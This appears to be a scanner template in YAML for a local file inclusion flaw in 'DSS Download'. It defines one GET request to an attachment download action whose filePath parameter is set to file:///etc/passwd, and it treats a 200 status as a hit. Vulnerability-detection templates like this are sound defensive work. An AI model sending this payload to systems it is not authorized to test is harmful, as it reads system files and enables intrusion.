id: dss-download-fileread
brief:
    title: DSS Download - Local File Inclusion
    by: ritikchaddha
    level: high
    about: DSS Download is vulnerable to local file inclusion.
    label:
        - lfi
        - dss
        - lfr
        - vuln
    score: CVSS:7.5
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd'
      signs:
        - "on": status
          status:
            - 200
